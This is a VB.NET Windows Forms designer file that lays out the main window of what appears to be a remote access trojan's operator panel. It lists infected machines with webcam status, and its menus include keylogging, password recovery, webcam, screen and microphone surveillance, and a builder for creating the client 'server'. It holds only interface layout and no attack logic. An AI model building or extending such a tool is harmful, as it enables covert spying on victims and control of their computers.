<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Main
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
        Me.ListViewMain = New System.Windows.Forms.ListView()
        Me.ColumnHeaderID = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderUsername = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderComputername = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderOperatingSystem = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderLocation = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderVersion = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeaderWebcam = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ContextMenuStripOptions = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.SendToAllToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallAllToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RebootAllToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupUsersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupByOSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupByCountryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupByWebcamToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowNoGroupsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GeneralToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SysteminformationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServerinformationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SystemManagersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessmanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServicemanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WindowmanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FilemanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RegistrymanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SoftwaremanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartupMonitorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScreenviewerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WebcamviewerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NetworkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NetworkviewerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadmanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SecurityToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordRecoveryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AdditionalToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FunmanagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MessageBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClipboardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartAsAdminToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFromDatabaseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageListFlags = New System.Windows.Forms.ImageList(Me.components)
        Me.MenuStripControl = New System.Windows.Forms.MenuStrip()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ConnectToToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisconnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BuilderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreateServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CreatePHPFilesToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SettingsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageListGeneral = New System.Windows.Forms.ImageList(Me.components)
        Me.NotifyIconWelcome = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusCaption = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatus = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripUsersOnline = New System.Windows.Forms.ToolStripStatusLabel()
        Me.MicrophoneToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ContextMenuStripOptions.SuspendLayout()
        Me.MenuStripControl.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ListViewMain
        '
        Me.ListViewMain.Alignment = System.Windows.Forms.ListViewAlignment.[Default]
        Me.ListViewMain.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ListViewMain.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeaderID, Me.ColumnHeaderUsername, Me.ColumnHeaderComputername, Me.ColumnHeaderOperatingSystem, Me.ColumnHeaderLocation, Me.ColumnHeaderVersion, Me.ColumnHeaderWebcam})
        Me.ListViewMain.ContextMenuStrip = Me.ContextMenuStripOptions
        Me.ListViewMain.FullRowSelect = True
        Me.ListViewMain.Location = New System.Drawing.Point(1, 26)
        Me.ListViewMain.MultiSelect = False
        Me.ListViewMain.Name = "ListViewMain"
        Me.ListViewMain.Size = New System.Drawing.Size(593, 276)
        Me.ListViewMain.SmallImageList = Me.ImageListFlags
        Me.ListViewMain.TabIndex = 0
        Me.ListViewMain.UseCompatibleStateImageBehavior = False
        Me.ListViewMain.View = System.Windows.Forms.View.Details
        '
        'ColumnHeaderID
        '
        Me.ColumnHeaderID.Text = "Server ID"
        Me.ColumnHeaderID.Width = 80
        '
        'ColumnHeaderUsername
        '
        Me.ColumnHeaderUsername.Text = "Username"
        Me.ColumnHeaderUsername.Width = 80
        '
        'ColumnHeaderComputername
        '
        Me.ColumnHeaderComputername.Text = "Computername"
        Me.ColumnHeaderComputername.Width = 130
        '
        'ColumnHeaderOperatingSystem
        '
        Me.ColumnHeaderOperatingSystem.Text = "Operating System"
        Me.ColumnHeaderOperatingSystem.Width = 135
        '
        'ColumnHeaderLocation
        '
        Me.ColumnHeaderLocation.Text = "Location"
        Me.ColumnHeaderLocation.Width = 100
        '
        'ColumnHeaderVersion
        '
        Me.ColumnHeaderVersion.Text = "Version"
        '
        'ColumnHeaderWebcam
        '
        Me.ColumnHeaderWebcam.Text = "Webcam"
        Me.ColumnHeaderWebcam.Width = 90
        '
        'ContextMenuStripOptions
        '
        Me.ContextMenuStripOptions.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ContextMenuStripOptions.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SendToAllToolStripMenuItem, Me.GroupUsersToolStripMenuItem, Me.GeneralToolStripMenuItem, Me.SystemManagersToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.NetworkToolStripMenuItem, Me.SecurityToolStripMenuItem, Me.AdditionalToolStripMenuItem, Me.ServerToolStripMenuItem})
        Me.ContextMenuStripOptions.Name = "ContextMenuStripOptions"
        Me.ContextMenuStripOptions.Size = New System.Drawing.Size(177, 224)
        '
        'SendToAllToolStripMenuItem
        '
        Me.SendToAllToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UninstallAllToolStripMenuItem, Me.RebootAllToolStripMenuItem})
        Me.SendToAllToolStripMenuItem.Image = CType(resources.GetObject("SendToAllToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SendToAllToolStripMenuItem.Name = "SendToAllToolStripMenuItem"
        Me.SendToAllToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.SendToAllToolStripMenuItem.Text = "Send To All"
        '
        'UninstallAllToolStripMenuItem
        '
        Me.UninstallAllToolStripMenuItem.Image = CType(resources.GetObject("UninstallAllToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallAllToolStripMenuItem.Name = "UninstallAllToolStripMenuItem"
        Me.UninstallAllToolStripMenuItem.Size = New System.Drawing.Size(140, 22)
        Me.UninstallAllToolStripMenuItem.Text = "Uninstall All"
        '
        'RebootAllToolStripMenuItem
        '
        Me.RebootAllToolStripMenuItem.Image = CType(resources.GetObject("RebootAllToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RebootAllToolStripMenuItem.Name = "RebootAllToolStripMenuItem"
        Me.RebootAllToolStripMenuItem.Size = New System.Drawing.Size(140, 22)
        Me.RebootAllToolStripMenuItem.Text = "Reboot All"
        '
        'GroupUsersToolStripMenuItem
        '
        Me.GroupUsersToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GroupByOSToolStripMenuItem, Me.GroupByCountryToolStripMenuItem, Me.GroupByWebcamToolStripMenuItem, Me.ShowNoGroupsToolStripMenuItem})
        Me.GroupUsersToolStripMenuItem.Image = CType(resources.GetObject("GroupUsersToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupUsersToolStripMenuItem.Name = "GroupUsersToolStripMenuItem"
        Me.GroupUsersToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.GroupUsersToolStripMenuItem.Text = "Group Users"
        '
        'GroupByOSToolStripMenuItem
        '
        Me.GroupByOSToolStripMenuItem.Image = CType(resources.GetObject("GroupByOSToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupByOSToolStripMenuItem.Name = "GroupByOSToolStripMenuItem"
        Me.GroupByOSToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.GroupByOSToolStripMenuItem.Text = "Group by OS"
        '
        'GroupByCountryToolStripMenuItem
        '
        Me.GroupByCountryToolStripMenuItem.Image = CType(resources.GetObject("GroupByCountryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupByCountryToolStripMenuItem.Name = "GroupByCountryToolStripMenuItem"
        Me.GroupByCountryToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.GroupByCountryToolStripMenuItem.Text = "Group by Country"
        '
        'GroupByWebcamToolStripMenuItem
        '
        Me.GroupByWebcamToolStripMenuItem.Image = CType(resources.GetObject("GroupByWebcamToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupByWebcamToolStripMenuItem.Name = "GroupByWebcamToolStripMenuItem"
        Me.GroupByWebcamToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.GroupByWebcamToolStripMenuItem.Text = "Group by Webcam"
        '
        'ShowNoGroupsToolStripMenuItem
        '
        Me.ShowNoGroupsToolStripMenuItem.Image = CType(resources.GetObject("ShowNoGroupsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ShowNoGroupsToolStripMenuItem.Name = "ShowNoGroupsToolStripMenuItem"
        Me.ShowNoGroupsToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.ShowNoGroupsToolStripMenuItem.Text = "Show No Groups"
        '
        'GeneralToolStripMenuItem
        '
        Me.GeneralToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SysteminformationToolStripMenuItem, Me.ServerinformationToolStripMenuItem})
        Me.GeneralToolStripMenuItem.Image = CType(resources.GetObject("GeneralToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GeneralToolStripMenuItem.Name = "GeneralToolStripMenuItem"
        Me.GeneralToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.GeneralToolStripMenuItem.Text = "General"
        '
        'SysteminformationToolStripMenuItem
        '
        Me.SysteminformationToolStripMenuItem.Image = CType(resources.GetObject("SysteminformationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SysteminformationToolStripMenuItem.Name = "SysteminformationToolStripMenuItem"
        Me.SysteminformationToolStripMenuItem.Size = New System.Drawing.Size(182, 22)
        Me.SysteminformationToolStripMenuItem.Text = "Systeminformation"
        '
        'ServerinformationToolStripMenuItem
        '
        Me.ServerinformationToolStripMenuItem.Image = CType(resources.GetObject("ServerinformationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerinformationToolStripMenuItem.Name = "ServerinformationToolStripMenuItem"
        Me.ServerinformationToolStripMenuItem.Size = New System.Drawing.Size(182, 22)
        Me.ServerinformationToolStripMenuItem.Text = "Serverinformation"
        '
        'SystemManagersToolStripMenuItem
        '
        Me.SystemManagersToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ProcessmanagerToolStripMenuItem, Me.ServicemanagerToolStripMenuItem, Me.WindowmanagerToolStripMenuItem, Me.FilemanagerToolStripMenuItem, Me.RegistrymanagerToolStripMenuItem, Me.SoftwaremanagerToolStripMenuItem, Me.StartupMonitorToolStripMenuItem})
        Me.SystemManagersToolStripMenuItem.Image = CType(resources.GetObject("SystemManagersToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SystemManagersToolStripMenuItem.Name = "SystemManagersToolStripMenuItem"
        Me.SystemManagersToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.SystemManagersToolStripMenuItem.Text = "System Managers"
        '
        'ProcessmanagerToolStripMenuItem
        '
        Me.ProcessmanagerToolStripMenuItem.Image = CType(resources.GetObject("ProcessmanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ProcessmanagerToolStripMenuItem.Name = "ProcessmanagerToolStripMenuItem"
        Me.ProcessmanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.ProcessmanagerToolStripMenuItem.Text = "Processmanager"
        '
        'ServicemanagerToolStripMenuItem
        '
        Me.ServicemanagerToolStripMenuItem.Image = CType(resources.GetObject("ServicemanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServicemanagerToolStripMenuItem.Name = "ServicemanagerToolStripMenuItem"
        Me.ServicemanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.ServicemanagerToolStripMenuItem.Text = "Servicemanager"
        '
        'WindowmanagerToolStripMenuItem
        '
        Me.WindowmanagerToolStripMenuItem.Image = CType(resources.GetObject("WindowmanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WindowmanagerToolStripMenuItem.Name = "WindowmanagerToolStripMenuItem"
        Me.WindowmanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.WindowmanagerToolStripMenuItem.Text = "Windowmanager"
        '
        'FilemanagerToolStripMenuItem
        '
        Me.FilemanagerToolStripMenuItem.Image = CType(resources.GetObject("FilemanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FilemanagerToolStripMenuItem.Name = "FilemanagerToolStripMenuItem"
        Me.FilemanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.FilemanagerToolStripMenuItem.Text = "Filemanager"
        '
        'RegistrymanagerToolStripMenuItem
        '
        Me.RegistrymanagerToolStripMenuItem.Image = CType(resources.GetObject("RegistrymanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RegistrymanagerToolStripMenuItem.Name = "RegistrymanagerToolStripMenuItem"
        Me.RegistrymanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.RegistrymanagerToolStripMenuItem.Text = "Registrymanager"
        '
        'SoftwaremanagerToolStripMenuItem
        '
        Me.SoftwaremanagerToolStripMenuItem.Image = CType(resources.GetObject("SoftwaremanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SoftwaremanagerToolStripMenuItem.Name = "SoftwaremanagerToolStripMenuItem"
        Me.SoftwaremanagerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.SoftwaremanagerToolStripMenuItem.Text = "Softwaremanager"
        '
        'StartupMonitorToolStripMenuItem
        '
        Me.StartupMonitorToolStripMenuItem.Image = CType(resources.GetObject("StartupMonitorToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StartupMonitorToolStripMenuItem.Name = "StartupMonitorToolStripMenuItem"
        Me.StartupMonitorToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.StartupMonitorToolStripMenuItem.Text = "Startupmanager"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ScreenviewerToolStripMenuItem, Me.WebcamviewerToolStripMenuItem, Me.MicrophoneToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Image = CType(resources.GetObject("SurveillanceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'ScreenviewerToolStripMenuItem
        '
        Me.ScreenviewerToolStripMenuItem.Image = CType(resources.GetObject("ScreenviewerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScreenviewerToolStripMenuItem.Name = "ScreenviewerToolStripMenuItem"
        Me.ScreenviewerToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
        Me.ScreenviewerToolStripMenuItem.Text = "Screenviewer"
        '
        'WebcamviewerToolStripMenuItem
        '
        Me.WebcamviewerToolStripMenuItem.Image = CType(resources.GetObject("WebcamviewerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WebcamviewerToolStripMenuItem.Name = "WebcamviewerToolStripMenuItem"
        Me.WebcamviewerToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
        Me.WebcamviewerToolStripMenuItem.Text = "Webcamviewer"
        '
        'NetworkToolStripMenuItem
        '
        Me.NetworkToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.NetworkviewerToolStripMenuItem, Me.DownloadmanagerToolStripMenuItem})
        Me.NetworkToolStripMenuItem.Image = CType(resources.GetObject("NetworkToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NetworkToolStripMenuItem.Name = "NetworkToolStripMenuItem"
        Me.NetworkToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.NetworkToolStripMenuItem.Text = "Network"
        '
        'NetworkviewerToolStripMenuItem
        '
        Me.NetworkviewerToolStripMenuItem.Image = CType(resources.GetObject("NetworkviewerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.NetworkviewerToolStripMenuItem.Name = "NetworkviewerToolStripMenuItem"
        Me.NetworkviewerToolStripMenuItem.Size = New System.Drawing.Size(181, 22)
        Me.NetworkviewerToolStripMenuItem.Text = "Networkviewer"
        '
        'DownloadmanagerToolStripMenuItem
        '
        Me.DownloadmanagerToolStripMenuItem.Image = CType(resources.GetObject("DownloadmanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadmanagerToolStripMenuItem.Name = "DownloadmanagerToolStripMenuItem"
        Me.DownloadmanagerToolStripMenuItem.Size = New System.Drawing.Size(181, 22)
        Me.DownloadmanagerToolStripMenuItem.Text = "Downloadmanager"
        '
        'SecurityToolStripMenuItem
        '
        Me.SecurityToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PasswordRecoveryToolStripMenuItem, Me.KeyloggerToolStripMenuItem})
        Me.SecurityToolStripMenuItem.Image = CType(resources.GetObject("SecurityToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SecurityToolStripMenuItem.Name = "SecurityToolStripMenuItem"
        Me.SecurityToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.SecurityToolStripMenuItem.Text = "Security"
        '
        'PasswordRecoveryToolStripMenuItem
        '
        Me.PasswordRecoveryToolStripMenuItem.Image = CType(resources.GetObject("PasswordRecoveryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem"
        Me.PasswordRecoveryToolStripMenuItem.Size = New System.Drawing.Size(186, 22)
        Me.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery"
        '
        'KeyloggerToolStripMenuItem
        '
        Me.KeyloggerToolStripMenuItem.Image = CType(resources.GetObject("KeyloggerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem"
        Me.KeyloggerToolStripMenuItem.Size = New System.Drawing.Size(186, 22)
        Me.KeyloggerToolStripMenuItem.Text = "Keylogger"
        '
        'AdditionalToolStripMenuItem
        '
        Me.AdditionalToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FunmanagerToolStripMenuItem, Me.MessageBoxToolStripMenuItem, Me.ClipboardToolStripMenuItem})
        Me.AdditionalToolStripMenuItem.Image = CType(resources.GetObject("AdditionalToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AdditionalToolStripMenuItem.Name = "AdditionalToolStripMenuItem"
        Me.AdditionalToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.AdditionalToolStripMenuItem.Text = "Additional"
        '
        'FunmanagerToolStripMenuItem
        '
        Me.FunmanagerToolStripMenuItem.Image = CType(resources.GetObject("FunmanagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FunmanagerToolStripMenuItem.Name = "FunmanagerToolStripMenuItem"
        Me.FunmanagerToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.FunmanagerToolStripMenuItem.Text = "Misc Functions"
        '
        'MessageBoxToolStripMenuItem
        '
        Me.MessageBoxToolStripMenuItem.Image = CType(resources.GetObject("MessageBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem"
        Me.MessageBoxToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.MessageBoxToolStripMenuItem.Text = "MessageBox"
        '
        'ClipboardToolStripMenuItem
        '
        Me.ClipboardToolStripMenuItem.Image = CType(resources.GetObject("ClipboardToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ClipboardToolStripMenuItem.Name = "ClipboardToolStripMenuItem"
        Me.ClipboardToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.ClipboardToolStripMenuItem.Text = "Clipboard"
        '
        'ServerToolStripMenuItem
        '
        Me.ServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseToolStripMenuItem, Me.RestartToolStripMenuItem, Me.RestartAsAdminToolStripMenuItem, Me.ToolStripSeparator1, Me.UninstallToolStripMenuItem, Me.DeleteFromDatabaseToolStripMenuItem})
        Me.ServerToolStripMenuItem.Image = CType(resources.GetObject("ServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem"
        Me.ServerToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.ServerToolStripMenuItem.Text = "Server"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.Image = CType(resources.GetObject("RestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'RestartAsAdminToolStripMenuItem
        '
        Me.RestartAsAdminToolStripMenuItem.Image = CType(resources.GetObject("RestartAsAdminToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartAsAdminToolStripMenuItem.Name = "RestartAsAdminToolStripMenuItem"
        Me.RestartAsAdminToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.RestartAsAdminToolStripMenuItem.Text = "Restart as Admin"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(169, 6)
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'DeleteFromDatabaseToolStripMenuItem
        '
        Me.DeleteFromDatabaseToolStripMenuItem.Image = CType(resources.GetObject("DeleteFromDatabaseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteFromDatabaseToolStripMenuItem.Name = "DeleteFromDatabaseToolStripMenuItem"
        Me.DeleteFromDatabaseToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.DeleteFromDatabaseToolStripMenuItem.Text = "Remove"
        '
        'ImageListFlags
        '
        Me.ImageListFlags.ImageStream = CType(resources.GetObject("ImageListFlags.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageListFlags.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageListFlags.Images.SetKeyName(0, "ad.png")
        Me.ImageListFlags.Images.SetKeyName(1, "ae.png")
        Me.ImageListFlags.Images.SetKeyName(2, "af.png")
        Me.ImageListFlags.Images.SetKeyName(3, "ag.png")
        Me.ImageListFlags.Images.SetKeyName(4, "ai.png")
        Me.ImageListFlags.Images.SetKeyName(5, "al.png")
        Me.ImageListFlags.Images.SetKeyName(6, "am.png")
        Me.ImageListFlags.Images.SetKeyName(7, "an.png")
        Me.ImageListFlags.Images.SetKeyName(8, "ao.png")
        Me.ImageListFlags.Images.SetKeyName(9, "ar.png")
        Me.ImageListFlags.Images.SetKeyName(10, "as.png")
        Me.ImageListFlags.Images.SetKeyName(11, "at.png")
        Me.ImageListFlags.Images.SetKeyName(12, "au.png")
        Me.ImageListFlags.Images.SetKeyName(13, "aw.png")
        Me.ImageListFlags.Images.SetKeyName(14, "ax.png")
        Me.ImageListFlags.Images.SetKeyName(15, "az.png")
        Me.ImageListFlags.Images.SetKeyName(16, "ba.png")
        Me.ImageListFlags.Images.SetKeyName(17, "bb.png")
        Me.ImageListFlags.Images.SetKeyName(18, "bd.png")
        Me.ImageListFlags.Images.SetKeyName(19, "be.png")
        Me.ImageListFlags.Images.SetKeyName(20, "bf.png")
        Me.ImageListFlags.Images.SetKeyName(21, "bg.png")
        Me.ImageListFlags.Images.SetKeyName(22, "bh.png")
        Me.ImageListFlags.Images.SetKeyName(23, "bi.png")
        Me.ImageListFlags.Images.SetKeyName(24, "bj.png")
        Me.ImageListFlags.Images.SetKeyName(25, "bm.png")
        Me.ImageListFlags.Images.SetKeyName(26, "bn.png")
        Me.ImageListFlags.Images.SetKeyName(27, "bo.png")
        Me.ImageListFlags.Images.SetKeyName(28, "br.png")
        Me.ImageListFlags.Images.SetKeyName(29, "bs.png")
        Me.ImageListFlags.Images.SetKeyName(30, "bt.png")
        Me.ImageListFlags.Images.SetKeyName(31, "bv.png")
        Me.ImageListFlags.Images.SetKeyName(32, "bw.png")
        Me.ImageListFlags.Images.SetKeyName(33, "by.png")
        Me.ImageListFlags.Images.SetKeyName(34, "bz.png")
        Me.ImageListFlags.Images.SetKeyName(35, "ca.png")
        Me.ImageListFlags.Images.SetKeyName(36, "catalonia.png")
        Me.ImageListFlags.Images.SetKeyName(37, "cc.png")
